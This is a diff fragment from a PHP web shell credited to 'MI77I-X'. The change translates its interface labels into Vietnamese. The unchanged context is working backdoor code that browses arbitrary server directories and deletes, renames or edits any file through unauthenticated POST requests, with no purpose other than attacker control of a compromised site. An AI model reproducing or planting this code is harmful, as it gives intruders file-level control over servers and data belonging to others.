@@ -2236,13 +2236,13 @@ if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
 if($_POST['type'] == 'dir'){
 if(rmdir($_POST['path'])){
 echo '<center><font color="#00ff00">Dir Deleted!</font></center><br />';
-}else{echo '<center><font color="red">Delete Dir Failed!</font></center><br />';}
+}else{echo '<center><font color="red">Xóa Dir Failed!</font></center><br />';}
 }elseif($_POST['type'] == 'file'){
-if(unlink($_POST['path'])){echo '<font color="#00ff00">Delete File Done.</font><br />';}else{
-echo '<font color="red">Delete File Error.</font><br />';}}}echo '</center>';
+if(unlink($_POST['path'])){echo '<font color="#00ff00">Xóa File Done.</font><br />';}else{
+echo '<font color="red">Xóa File Error.</font><br />';}}}echo '</center>';
 $scandir = scandir($path);
 echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first">
-<th><center>Name</center></th><th width="12%"><center>Size</center></th><th width="10%"><center>Permissions</center></th>
+<th><center>Tên</center></th><th width="12%"><center>Size</center></th><th width="10%"><center>Permissions</center></th>
 <th width="15%"><center>Last Update</center></th><th width="11%"><center>Options</center></th></tr>';
 foreach($scandir as $dir){
 if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
@@ -2252,7 +2252,7 @@ elseif(!is_readable("$path/$dir")) echo '<font color="red">';
 echo perms("$path/$dir");
 if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
 echo"</center></td><td><center>".date("d-M-Y H:i", filemtime("$path/$dir"))."";echo "</center></td>
-<td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$dir\"><input type=\"hidden\" name=\"path\" value=\"$path/$dir\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";}
+<td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Xóa</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$dir\"><input type=\"hidden\" name=\"path\" value=\"$path/$dir\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";}
 foreach($scandir as $file){if(!is_file("$path/$file")) continue;$size = filesize("$path/$file")/1024;
 $size = round($size,3);if($size >= 1024){$size = round($size/1024,2).' MB';}else{$size = $size.' KB';}
 echo "<tr><td>[F] <a href=\"?filesrc=$path/$file&path=$path\">$file</a></td><td><center>".$size."</center></td><td><center>";
@@ -2261,7 +2261,7 @@ elseif(!is_readable("$path/$file")) echo '<font color="red">';
 echo perms("$path/$file");
 if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
 echo"</center></td><td><center>".date("d-M-Y H:i",filemtime("$path/$file"))."";
-echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$file\"><input type=\"hidden\" name=\"path\" value=\"$path/$file\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";}
+echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Xóa</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$file\"><input type=\"hidden\" name=\"path\" value=\"$path/$file\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";}
 echo '</table></div>';}echo '</body></html>';
 function perms($file){$perms = fileperms($file);if (($perms & 0xC000) == 0xC000) {$info = 's';} elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} elseif (($perms & 0x8000) == 0x8000) {$info = '-';} elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} else {$info = 'u';} $info .= (($perms & 0x0100) ? 'r' : '-');$info .= (($perms & 0x0080) ? 'w' : '-');$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));$info .= (($perms & 0x0020) ? 'r' : '-');$info .= (($perms & 0x0010) ? 'w' : '-');$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));$info .= (($perms & 0x0004) ? 'r' : '-');$info .= (($perms & 0x0002) ? 'w' : '-');$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));return $info;}
 echo'<br><center>&copy; 2017 - <a href="mailto:mi77ihaxor@gmail.com">MI77I-X</a>.</center><br>';?>
